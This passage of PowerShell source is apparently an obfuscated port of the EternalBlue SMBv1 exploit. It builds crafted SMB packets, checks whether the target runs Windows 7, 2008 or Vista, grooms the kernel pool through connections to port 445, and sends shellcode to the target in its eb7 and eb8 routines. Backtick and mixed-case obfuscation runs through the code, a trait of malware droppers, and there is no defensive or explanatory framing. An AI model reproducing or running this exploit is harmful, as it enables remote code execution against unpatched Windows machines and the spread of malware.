$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00,0x00,0x80
$pkt += 0x16,0x00
$pkt += $native_os
$pkt += [Byte[]] (0x00) * 17
return $pkt
}
function smb2_grooms($target, $grooms, $payload_hdr_pkt, $groom_socks){
for($i =0; $i -lt $grooms; $i++)
{
$client = neW`-objE`ct System.Net.Sockets.TcpClient($target,445)
$gsock = $client.Client
$groom_socks += $gsock
$gsock.Send($payload_hdr_pkt) | OUT-N`Ull
}
return $groom_socks
}
function make_smb2_payload_headers_packet(){
[Byte[]] $pkt = [Byte[]](0x00,0x00,0xff,0xf7,0xFE) + [system.Text.Encoding]::ASCII.GetBytes(('SM'+'B')) + [Byte[]](0x00)*124
return $pkt
}
function eb7($target ,$shellcode) {
$NTFEA_SIZE = 0x11000
$ntfea10000=0x00,0x00,0xdd,0xff+[byte[]]0x41*0xffde
$ntfea11000 =(0x00,0x00,0x00,0x00,0x00)*600
$ntfea11000 +=0x00,0x00,0xbd,0xf3+[byte[]]0x41*0xf3be
$ntfea1f000=(0x00,0x00,0x00,0x00,0x00)*0x2494
$ntfea1f000=0x00,0x00,0xed,0x48+0x41*0x48ee
$ntfea=@{0x10000=$ntfea10000;0x11000=$ntfea11000}
$TARGET_HAL_HEAP_ADDR_x64 = 0xffffffffffd00010
$TARGET_HAL_HEAP_ADDR_x86 = 0xffdff000
[byte[]]$fakeSrvNetBufferNsa = @(0x00,0x10,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x01,0x00,0x00,0x00,0x00,0x00,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xf1,0xdf,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0xf0,0xdf,0xff,0x00,0xf1,0xdf,0xff,0x00,0x00,0x00,0x00,0x60,0x00,0x04,0x10,0x00,0x00,0x00,0x00,0x80,0xef,0xdf,0xff,0x00,0x00,0x00,0x00,0x10,0x00,0xd0,0xff,0xff,0xff,0xff,0xff,0x10,0x01,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x60,0x00,0x04,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x90,0xff,0xcf,0xff,0xff,0xff,0xff,0xff)
[byte[]]$fakeSrvNetBufferX64 = @(0x00,0x10,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x01,0x00,0x00,0x00,0x00,0x00,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0xd0,0xff,0xff,0xff,0xff,0xff,0x10,0x01,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x60,0x00,0x04,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x90,0xff,0xcf,0xff,0xff,0xff,0xff,0xff)
$fakeSrvNetBuffer = $fakeSrvNetBufferNsa
[byte[]]$feaList=[byte[]](0x00,0x00,0x01,0x00)
$feaList += $ntfea[$NTFEA_SIZE]
$feaList +=0x00,0x00,0x8f,0x00+ $fakeSrvNetBuffer
$feaList +=0x12,0x34,0x78,0x56
[byte[]]$fake_recv_struct=@(0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb0,0x00,0xd0,0xff,0xff,0xff,0xff,0xff,0xb0,0x00,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0xf0,0xdf,0xff,0xc0,0xf0,0xdf,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x90,0xf1,0xdf,0xff,0x00,0x00,0x00,0x00,0xef,0xf1,0xdf,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xf0,0x01,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0x01,0xd0,0xff,0xff,0xff,0xff,0xff)
$client = ne`W-O`B`JECT System.Net.Sockets.TcpClient($target,445)
$sock = $client.Client
$sock.ReceiveTimeout =5000
cl`ien`T`_NeGOtIAte($sock) | O`UT-`NuLL
$raw, $smbheader = SM`B1_a`NoNymO`U`S_Lo`g`iN $sock
$os=[system.Text.Encoding]::ascii.GetString($raw[45..($raw.count-1)]).ToLower()
if (!(($os.contains(('wi'+'ndo'+'ws 7'))) -or ($os.contains(('wi'+'nd'+'ows')) -and $os.contains(('2'+'008'))) -or ($os.contains(('win'+'dow'+'s vi'+'sta'))) -or ($os.contains(('w'+'in'+'dows')) -and $os.contains(('2'+'011')))))
{return $False}
$raw, $smbheader = Tr`ee_`C`OnNec`T_a`NdX $sock $target $smbheader.user_id

$progress , $timeout= seND_bIG_T`R`A`NS2 $sock $smbheader $feaList 2000 $False
$allocConn = C`ReAT`ese`sSIOn`A`llO`cnOnpAGEd $target ($NTFEA_SIZE - 0x1010)
$payload_hdr_pkt = maKE_s`Mb`2_pa`yl`OAD_hEaDe`Rs_PA`c`KeT
$groom_socks =@()
for ($i=0; $i -lt 13; $i++)
{
$client = ne`w-oBj`Ect System.Net.Sockets.TcpClient($target,445)
$gsock = $client.Client
$groom_socks += $gsock
$gsock.Send($payload_hdr_pkt) | OUt`-NU`Ll
}
$holeConn = Cre`AteseSSi`on`ALlOcnonP`AgeD $target ($NTFEA_SIZE - 0x10)
$allocConn.close()
for ($i=0; $i -lt 5; $i++)
{
$client = NE`W-O`BjecT System.Net.Sockets.TcpClient($target,445)
$gsock = $client.Client
$groom_socks += $gsock
$gsock.Send($payload_hdr_pkt) | O`Ut-NULl
}
$holeConn.close()
$trans2_pkt = m`AkE_SMB1_`Tr`Ans`2_lA`st`_pAcKeT $smbheader.tree_id $smbheader.user_id $feaList[$progress..$feaList.count] $timeout
$sock.Send($trans2_pkt) | OUt-Nu`ll
$raw, $trans2header = smB1_ge`T`_re`spO`Nse($sock)
foreach ($sk in $groom_socks)
{
$sk.Send($fake_recv_struct + $shellcode) | oU`T-n`ULl
}
foreach ($sk in $groom_socks)
{
$sk.close() | ou`T`-NulL
}
$sock.Close()| ou`T`-nuLl
return $True
}


function createFakeSrvNetBuffer8($sc_size)
{
    $totalRecvSize = 0x80 + 0x180 + $sc_size
	$fakeSrvNetBufferX64 = [byte[]]0x00*16
	$fakeSrvNetBufferX64 += 0xf0,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0xd0,0xff,0xff,0xff,0xff,0xff
	$fakeSrvNetBufferX64 += 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xe8,0x82,0x00,0x00,0x00,0x00,0x00,0x00
	$fakeSrvNetBufferX64 +=  [byte[]]0x00*16
    $a=[bitconverter]::GetBytes($totalRecvSize)
	$fakeSrvNetBufferX64 += [byte[]]0x00*8+$a+[byte[]]0x00*4
	$fakeSrvNetBufferX64 += 0x00,0x40,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x40,0xd0,0xff,0xff,0xff,0xff,0xff
	$fakeSrvNetBufferX64 += [byte[]]0x00*48
	$fakeSrvNetBufferX64 += 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x60,0x00,0x04,0x10,0x00,0x00,0x00,0x00
	$fakeSrvNetBufferX64 += 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x3f,0xd0,0xff,0xff,0xff,0xff,0xff
	return $fakeSrvNetBufferX64
}

function createFeaList8($sc_size, $ntfea){
	$feaList = 0x00,0x00,0x01,0x00
	$feaList += $ntfea
	$fakeSrvNetBuf = Cr`eA`TEFakeSRVNeTbuFfE`R8($sc_size)
    $a=[bitconverter]::GetBytes($fakeSrvNetBuf.Length-1)
	$feaList += 0x00,0x00,$a[0],$a[1] + $fakeSrvNetBuf
	$feaList += 0x12,0x34,0x78,0x56
	return $feaList
}

function  make_smb1_login8_packet8 {
    [Byte[]] $pkt = [Byte[]] (0x00)
    $pkt += 0x00,0x00,0x88
    $pkt += 0xff,0x53,0x4D,0x42
    $pkt += 0x73
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x18
    $pkt += 0x01,0x48
    $pkt += 0x00,0x00
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x00,0x00
    $pkt += 0xff,0xff
    $pkt += 0x2f,0x4b
    $pkt += 0x00,0x00
    $pkt += 0x00,0x00
    $pkt += 0x0c
    $pkt += 0xff
    $pkt += 0x00
    $pkt += 0x00,0x00
    $pkt += 0x00,0xf0
    $pkt += 0x02,0x00
    $pkt += 0x01,0x00
    $pkt += 0x00,0x00,0x00,0x00
	$pkt += 0x42,0x00,0x00,0x00,0x00,0x00
	$pkt += 0x44,0xc0,0x00,0x80
	$pkt += 0x4d,0x00
	$pkt += 0x60,0x40,0x06,0x06,0x2b,0x06,0x01,0x05,0x05,0x02,0xa0,0x36,0x30,0x34,0xa0,0x0e,0x30,0x0c,0x06,0x0a,0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a,0xa2,0x22,0x04,0x20,0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x01,0x00,0x00,0x00,0x05,0x02,0x88,0xa0,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
    $pkt += 0x55,0x6e,0x69,0x78,0x00
    $pkt += 0x53,0x61,0x6d,0x62,0x61,0x00
    return $pkt
}
function  make_ntlm_auth_packet8($user_id) {
    [Byte[]] $pkt = [Byte[]] (0x00)
    $pkt += 0x00,0x00,0x96
    $pkt += 0xff,0x53,0x4D,0x42
    $pkt += 0x73
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x18
    $pkt += 0x01,0x48
    $pkt += 0x00,0x00
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x00,0x00
    $pkt += 0xff,0xff
    $pkt += 0x2f,0x4b
    $pkt += $user_id
    $pkt += 0x00,0x00
    $pkt += 0x0c
    $pkt += 0xff
    $pkt += 0x00
    $pkt += 0x00,0x00
    $pkt += 0x00,0xf0
    $pkt += 0x02,0x00
    $pkt += 0x01,0x00
    $pkt += 0x00,0x00,0x00,0x00
	$pkt += 0x50,0x00,0x00,0x00,0x00,0x00
	$pkt += 0x44,0xc0,0x00,0x80
	$pkt += 0x5b,0x00
	$pkt += 0xa1,0x4e,0x30,0x4c,0xa2,0x4a,0x04,0x48,0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x08,0x00,0x08,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x05,0x02,0x88,0xa0,0x4e,0x00,0x55,0x00,0x4c,0x00,0x4c,0x00

    $pkt += 0x55,0x6e,0x69,0x78,0x00
    $pkt += 0x53,0x61,0x6d,0x62,0x61,0x00
    return $pkt
}
function smb1_login8($sock){
    $raw_proto = M`AKE`_s`mB1_`l`O`GiN8_pAc`KeT8
    $sock.Send($raw_proto) | OU`T`-NUlL
    $raw, $smbheader=SM`B1_`Get_REspONS`E8($sock)
    $raw_proto = mAk`e_nT`Lm`_AuTh_`paCKET8($smbheader.user_id)
    $sock.Send($raw_proto) | O`UT`-NULL
    return SMb1_G`e`T_re`spoNSe8($sock)


}
function negotiate_proto_request8($use_ntlm)
{
      [Byte[]]  $pkt = [Byte[]] (0x00)
      $pkt += 0x00,0x00,0x2f
      $pkt += 0xFF,0x53,0x4D,0x42
      $pkt += 0x72
      $pkt += 0x00,0x00,0x00,0x00
      $pkt += 0x18
      if($use_ntlm){ $pkt +=  0x01,0x48 }
      else{ $pkt +=  0x01,0x40 }
      $pkt += 0x00,0x00
      $pkt += 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
      $pkt += 0x00,0x00
      $pkt += 0xff,0xff
      $pkt += 0x2F,0x4B
      $pkt += 0x00,0x00
      $pkt += 0x00,0x00
      $pkt += 0x00
      $pkt += 0x0c,0x00
      $pkt += 0x02
      $pkt += 0x4E,0x54,0x20,0x4C,0x4D,0x20,0x30,0x2E,0x31,0x32,0x00
      return $pkt
}
function smb_header8($smbheader) {
$parsed_header =@{server_component=$smbheader[0..3];
                  smb_command=$smbheader[4];
                  error_class=$smbheader[5];
                  reserved1=$smbheader[6];
                  error_code=$smbheader[7..8];
                  flags=$smbheader[9];
                  flags2=$smbheader[10..11];
                  process_id_high=$smbheader[12..13];
                  signature=$smbheader[14..21];
                  reserved2=$smbheader[22..23];
                  tree_id=$smbheader[24..25];
                  process_id=$smbheader[26..27];
                  user_id=$smbheader[28..29];
                  multiplex_id=$smbheader[30..31];
                 }
return $parsed_header
}

function smb1_get_response8($sock){
    $sock.ReceiveTimeout =5000
    $tcp_response = [Array]::CreateInstance(('b'+'yte'), 1024)
    try{
    $sock.Receive($tcp_response)| Out-n`UlL
     }
     catch {
      return -1,-1
     }
    $netbios = $tcp_response[0..4]
    $smb_header8 = $tcp_response[4..36]
    $parsed_header = sm`B_hEaDE`R8($smb_header8)
    return $tcp_response, $parsed_header

}


function client_negotiate8($sock , $use_ntlm){
    $raw_proto = NE`got`IatE_P`RotO`_rEQuEsT8($use_ntlm)
    $sock.Send($raw_proto) | oUT-`N`Ull
    return SMB1`_`get_rEs`PONSE8($sock)

}
function tree_connect_andx8($sock, $target, $userid){
    $raw_proto = TReE_coNN`eCT_anD`X`8_RE`q`UEST $target $userid
    $sock.Send($raw_proto) | oU`T-nULl
   return SMB`1_`GEt_R`EspOnSE8($sock)
}
function tree_connect_andx8_request($target, $userid) {

     [Byte[]] $pkt = [Byte[]](0x00)
     $pkt +=0x00,0x00,0x48
     $pkt +=0xFF,0x53,0x4D,0x42
     $pkt +=0x75
     $pkt +=0x00,0x00,0x00,0x00
     $pkt +=0x18
     $pkt +=0x01,0x48
     $pkt +=0x00,0x00
     $pkt +=0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
     $pkt +=0x00,0x00
     $pkt +=0xff,0xff
     $pkt +=0x2F,0x4B
     $pkt += $userid
     $pkt +=0x00,0x00
    $ipc = (('oA'+'IoAI')-RePLACE'oAI',[chAr]92)+ $target + "\IPC$"
     $pkt +=0x04
     $pkt +=0xFF
     $pkt +=0x00
     $pkt +=0x00,0x00
     $pkt +=0x00,0x00
     $pkt +=0x01,0x00
	 $al=[system.Text.Encoding]::ASCII.GetBytes($ipc).Count+8
	 $pkt+=[bitconverter]::GetBytes($al)[0],0x00
     $pkt +=0x00
     $pkt += [system.Text.Encoding]::ASCII.GetBytes($ipc)
     $pkt += 0x00
     $pkt += 0x3f,0x3f,0x3f,0x3f,0x3f,0x00
	$len = $pkt.Length - 4
	$hexlen = [bitconverter]::GetBytes($len)[-2..-4]
	$pkt[1] = $hexlen[0]
	$pkt[2] = $hexlen[1]
	$pkt[3] = $hexlen[2]
    return $pkt
    }

function make_smb1_nt_trans_packet8($tree_id, $user_id) {

    [Byte[]]  $pkt = [Byte[]] (0x00)
    $pkt += 0x00,0x08,0x3C
    $pkt += 0xff,0x53,0x4D,0x42
    $pkt += 0xa0
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x18
    $pkt += 0x01,0x48
    $pkt += 0x00,0x00
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x00,0x00
    $pkt += $tree_id
    $pkt += 0x2f,0x4b
    $pkt += $user_id
    $pkt += 0x00,0x00

    $pkt += 0x14
    $pkt += 0x01
    $pkt += 0x00,0x00
    $pkt += 0x1e,0x00,0x00,0x00
    $pkt += 0x49,0x01,0x01,0x00
    $pkt += 0x1e,0x00,0x00,0x00
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x1e,0x00,0x00,0x00
    $pkt += 0x4c,0x00,0x00,0x00
    $pkt += 0x49,0x01,0x00,0x00
    $pkt += 0x6c,0x00,0x00,0x00
    $pkt += 0x01
    $pkt += 0x00,0x00
    $pkt += 0x00,0x00
    $pkt += 0x6a,0x01
    $pkt += 0xff
    $pkt += [Byte[]] (0x00) * 0x1e
    $pkt += 0xff,0xff,0x00,0x00,0x01
    $pkt += [Byte[]](0x00) * 0x146
    $len = $pkt.Length - 4
    $hexlen = [bitconverter]::GetBytes($len)[-2..-4]
    $pkt[1] = $hexlen[0]
    $pkt[2] = $hexlen[1]
    $pkt[3] = $hexlen[2]
    return $pkt
  }

function make_smb1_trans2_exploit_packet8($tree_id, $user_id, $data, $timeout) {

    $timeout = ($timeout * 0x10) + 1
    [Byte[]]  $pkt = [Byte[]] (0x00)
    $pkt += 0x00,0x10,0x38
    $pkt += 0xff,0x53,0x4D,0x42
    $pkt += 0x33
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x18
    $pkt += 0x01,0x48
    $pkt += 0x00,0x00
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x00,0x00
    $pkt += $tree_id
    $pkt += 0x2f,0x4b
    $pkt += $user_id
    $pkt += 0x00,0x00

    $pkt += 0x09
    $pkt += 0x00,0x00
    $pkt += 0x00,0x10
    $pkt += 0x00,0x00
    $pkt += 0x00,0x00
    $pkt += 0x00
    $pkt += 0x00
    $pkt += 0x00,0x10
    $pkt += 0x38,0x00,0x49
    $pkt += [bitconverter]::GetBytes($timeout)[0]
    $pkt += 0x00,0x00
    $pkt += 0x03,0x10

    $pkt += 0xff,0xff,0xff
    $pkt +=$data
    $len = $pkt.Length - 4
    $hexlen = [bitconverter]::GetBytes($len)[-2..-4]
    $pkt[1] = $hexlen[0]
    $pkt[2] = $hexlen[1]
    $pkt[3] = $hexlen[2]
    return $pkt
}

function send_big_trans28($sock, $smbheader, $data, $firstDataFragmentSize, $sendLastChunk){

    $nt_trans_pkt = m`AK`e_S`M`B1_nt`_tRA`N`S_pa`ckeT8 $smbheader.tree_id $smbheader.user_id
    $sock.Send($nt_trans_pkt) | O`UT-`Null

    $raw, $transheader = SMB1_ge`T_R`e`S`pOnse8($sock)
    if (!($transheader.error_class -eq 0x00 -and ($transheader.reserved1 -eq 0x00) -and ($transheader.error_code[0] -eq 0x00) -and ($transheader.error_code[1] -eq 0x00)))
    {
    return -1,-1
    }

    $i=$firstDataFragmentSize
    $timeout=0
    while ($i -lt $data.count)
    {
        $sendSize=[System.Math]::Min(4096,($data.count-$i))
        if (($data.count-$i) -le 4096){
         if (!$sendLastChunk)
            { break }
         }
        $trans2_pkt = MAKe_sMb1_t`RaNS2_exP`l`o`it_`PackEt8 $smbheader.tree_id $smbheader.user_id $data[$i..($i+$sendSize-1)] $timeout
        $sock.Send($trans2_pkt) | o`U`T-nulL
        $timeout+=1
        $i +=$sendSize
    }
    if ($sendLastChunk)
    {sM`B1_`get_`RespO`NsE8($sock) }
    return $i,$timeout
}
function createSessionAllocNonPaged8($target, $size) {
   $client = N`eW`-O`BJecT System.Net.Sockets.TcpClient($target,445)
   $sock = $client.Client
   CLieN`T_NE`GoT`iat`e8 $sock $false | OUt-`Nu`ll
   $flags2=16385
   if ($size -ge 0xffff)
   { $reqsize=$size /2}
   else
   {
     $flags2 =49153
     $reqsize= $size
   }

    $a=[bitconverter]::GetBytes($reqsize)
    $b=[bitconverter]::GetBytes($flags2)
    $pkt =  MAke_sMB1_fReE_H`oL`E_`se`s`sI`on_paC`k`eT8 ($b[0],$b[1]) (0x02,0x00) ($a[0],$a[1],0x00,0x00,0x00)

    $sock.Send($pkt) | O`Ut-`NuLL
    Smb1_gE`T_rEsP`ON`se8($sock) | O`Ut-n`ULL
    return $sock
}
function  make_smb1_free_hole_session_packet8($flags2, $vcnum, $native_os) {

    [Byte[]] $pkt = 0x00
    $pkt += 0x00,0x00,0x51
    $pkt += 0xff,0x53,0x4D,0x42
    $pkt += 0x73
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x18
    $pkt += $flags2
    $pkt += 0x00,0x00
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x00,0x00
    $pkt += 0xff,0xff
    $pkt += 0x2f,0x4b
    $pkt += 0x00,0x00
    $pkt += 0x00,0x00
    $pkt += 0x0c
    $pkt += 0xff
    $pkt += 0x00
    $pkt += 0x00,0x00
    $pkt += 0x00,0xf0
    $pkt += 0x02,0x00
    $pkt += $vcnum
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x00,0x00
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x40,0x00,0x00,0x80
    $pkt += 0x16,0x00
    $pkt += $native_os
    $pkt += [Byte[]] (0x00) * 17
    return $pkt
  }

function make_smb2_payload_headers_packet8($for_nx){
    [Byte[]] $pkt = [Byte[]](0x00,0x00,0x81,0x00) + [system.Text.Encoding]::ASCII.GetBytes(('BA'+'AD'))
    if ($for_nx){ $pkt+=[Byte[]](0x00)*123 }
    else{ $pkt+=[Byte[]](0x00)*124  }
    return $pkt
}


function eb8($target,$sc) {
    $NTFEA_SIZE8 = 0x9000
	$ntfea9000=[byte[]]0x00*0xbe0
	$ntfea9000 +=0x00,0x00,0x5c,0x73+[byte[]]0x00*0x735d
	$ntfea9000 +=0x00,0x00,0x47,0x81+[byte[]]0x00*0x8148


    $TARGET_HAL_HEAP_ADDR = 0xffffffffffd04000
    $SHELLCODE_PAGE_ADDR =  0xffffffffffd04000
    $PTE_ADDR=0xfffff6ffffffe820

    $fakeSrvNetBufferX64Nx =@(0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xf0,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x60,0x00,0x04,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xa8,0xe7,0xff,0xff,0xff,0xf6,0xff,0xff)

    [byte[]]$feaListNx=[byte[]](0x00,0x00,0x01,0x00)
    $feaListNx += $ntfea9000
    $feaListNx +=0x00,0x00,0xaf,0x00+ $fakeSrvNetBufferX64Nx
    $feaListNx +=0x12,0x34,0x78,0x56
    [byte[]]$fake_recv_struct=@(0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x58,0x40,0xd0,0xff,0xff,0xff,0xff,0xff,0x58,0x40,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0